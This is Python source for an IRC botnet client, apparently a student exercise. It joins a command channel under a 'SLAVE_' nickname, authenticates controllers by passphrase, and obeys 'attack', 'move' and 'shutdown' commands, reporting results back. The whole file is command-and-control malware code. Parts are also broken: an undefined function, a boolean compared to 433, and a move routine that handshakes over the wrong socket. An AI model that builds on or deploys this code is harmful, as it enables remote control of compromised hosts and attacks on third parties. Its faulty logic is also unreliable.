import time
import socket 
import sys 
import threading
import random 
import traceback

class Bot:
    
    def setup(self, host, port, channel, phrase):
        self.HOST = host
        self.PORT = int(port)
        self.CHANNEL = channel
        self.PHRASE = phrase
        self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # BOT INFO
        self.botNick = "SLAVE_" + str(random.randrange(10000))
        self.liveConnection = False # Flag to see if controller connection to IRC Server is active
        self.command = None
        self.attackCount = 0
        self.failCount = 1

        # BOT INFO - This is from controller
        self.botList = []
        self.botsSuccessful = []
        self.botsFailed = []
        self.botsMoved = []
        self.botsDisconnected = []
        self.acceptedCons = []

        try:
            self.IRCSOCKET.connect((self.HOST, self.PORT))
        except Exception as e:
            sys.stderr.write("Error: " + str(e))
            sys.exit(0)

        
    # Used for initial connection or connecting to a new channel
    def IRCconnect(self, chan):
        self.sendData("NICK {}\n" .format(self.botNick))
        self.sendData("USER bot * * :{}\n" .format(self.botNick))
        self.sendData("JOIN #{}\n" .format(chan))
        resp = self.getData()
        print(resp)
        return "433" in resp

    # PingPong protocol
    def pong(self):
        pass

    # Get response from Controller  
    def getData(self):
        return self.IRCSOCKET.recv(2048).decode().strip('\n\r')

    # Message Encoder
    def sendData(self, msg):
        print(msg)
        self.IRCSOCKET.send(msg.encode())

    # Send to Controller 
    # Receiver should be CONBOT
    def privateMsg(self, receiver, msg):
        self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))


    # Gets response 
    def handleResponse(self, prefix, message):
        if message == self.PHRASE:
            if prefix not in self.acceptedCons:
                self.acceptedCons.append(prefix)
        if prefix in self.acceptedCons:
            if message == "status":
                x = random.randint(1,4)
                y = random.randint(1,5)
                time.sleep(x/y)
                self.privateMsg(prefix, "Correct pass - " + self.botNick)
            elif message.startswith("attack"):
                if len(message.split()) == 3:
                    hostTarget = message.split()[1]
                    portTarget = message.split()[2]
                    self.botAttack(hostTarget, portTarget)
                else:
                    print("Incorrect usage of command: attack <host-name> <port>")
            elif message.startswith("move"):
                if len(message.split()) == 4:
                    newHost = message.split()[1]
                    newPort = message.split()[2]
                    newChannel = message.split()[3]
                    x = random.randint(1,4)
                    y = random.randint(1,5)
                    time.sleep(x/y)
                    self.botMove(newHost, newPort, newChannel)
                else:
                    print("Incorrect usage of command: move <host-name> <port> <channel>")
            elif message == "shutdown":
                x = random.randint(1,4)
                y = random.randint(1,5)
                time.sleep(x/y)
                self.privateMsg(prefix, "Shutdown successful - " + self.botNick)
                self.IRCSOCKET.close()
                sys.exit(0)
            

    # BOT COMMAND FUNCTIONS HERE ---------------------------------------------------------------------------------------------

    # Send Stats (Just the name of bot)
    def botStatus(self):
        global botNick
        sendPrivate("My name is: " + str(botNick))

    # Attack Server
    def botAttack(self, host, port):
        try:
            targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port = int(port)
            targetSocket.connect((host, port))
            self.attackCount = self.attackCount + 1 
            msg = str(self.botNick) + " " + str(self.attackCount) + "\n"
            targetSocket.send(msg.encode())
            # Send private message that attack was successful
            msg = ("Attack successful - " + self.botNick + " - " + "Success: " + str(self.attackCount) + " Failed: " + str(self.failCount))
            for x in self.acceptedCons:
                self.privateMsg(x, msg)
        except Exception as e:
            print("found exception" + str(e))
            reason = "unknown reason"
            if isinstance(e, socket.gaierror):
                reason = "no such hostname"
            msg = ("Attack failed - " + self.botNick + " - " + str(reason))
            print(msg)
            self.failCount = self.failCount + 1
            for x in self.acceptedCons:
                self.privateMsg(x, msg)
            #tb = traceback.format_exc()
            #print(tb)
            pass 
            
    
    # Move Server
    def botMove(self, newHost, newPort, newChannel):
        #global HOST, PORT, CHANNEL, botNick 
        # First attempt to connect to new server 
        try:
            newSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            newPort = int(newPort)
            newSocket.connect((newHost, newPort))

            # At this point, if it doesn't throw an exception, it should be good 
            # Now connect bot to channel
            self.IRCconnect(newChannel)
            resp = self.getData()
            print(resp)


            for x in self.acceptedCons:
                self.privateMsg(x, "Move successful - " + str(self.botNick))
            # If it reaches this point, connection is successful. Change globals
            self.HOST = newHost 
            self.PORT = newPort 
            self.CHANNEL = newChannel 
            
            # Disconnect from old Channel
            try:
                self.IRCSOCKET.close()
                self.IRCSOCKET = newSocket 
            except:
                pass
 
            return True 
        except:
            print("ERROR: Unable to move to new channel\nBot still in old channel")
            tb = traceback.format_exc()
            print(tb)
            for x in self.acceptedCons:
                self.privateMsg(x, "Move failed - " + str(self.botNick))
            return False 
        
    def changeNick(self):
        oldName = self.botNick 
        self.botNick = "SLAVE_" + str(random.randrange(10000))
        self.IRCconnect(self.CHANNEL)
        for x in self.acceptedCons:
            self.privateMsg(x, oldName + " has been renamed to " + self.botNick + " due to existing name in channel. Attempting to reconnect")
        return

    # Read
    def reader(self):
        try:
            while True:
                response = self.getData()
                if(response != ""):                                         
                        if response.find("PRIVMSG") != -1:                           
                            name = response.split('!',1)[0][1:]
                            message = response.split('PRIVMSG',1)[1].split(':',1)[1]
                            self.handleResponse(name, message)                               
                        elif response.find("PING") != -1:
                            self.sendData("PONG {}: :\r\n".format(self.HOST))                                                                         
                        elif response.find('433') != -1:
                            self.changeNick()
                            pass
        except Exception as e:
            print("Exception: ")
            print(e)
            print("Reconnecting in 5 seconds ...")
            time.sleep(5)
            self.reader()
            
def main():
    
    invalidNick = True
    noConnection = True
        # Get sys.argv
    if len(sys.argv) != 5:
        print("Wrong number of arguments")
        sys.exit() 
    
    HOST = sys.argv[1]
    PORT = sys.argv[2]
    CHANNEL = sys.argv[3]
    PHRASE = sys.argv[4]

    # Check if port is in valid range 
    if not PORT.isdigit():
        print("Invalid port.")
        sys.exit() 
    
    bot = Bot()

    # Keep connection to IRC server 
    while True:
        
        # set up controller bot and try to connect to the IRC
        try:
            print("setting up bot")
            bot.setup(HOST, PORT, CHANNEL, PHRASE)
        except Exception as e:
            print("{} Trying to reconnect..." .format(e))
            continue

        print("Bot setting up")
        print("connecting")
        while noConnection:
            noConnection = bot.IRCconnect(CHANNEL)
            if noConnection != 433:
                bot.changeNick()
        
        print("Controller is running. Connected with nick: " + bot.botNick)

        bot.reader()



if __name__ == "__main__":
    main()


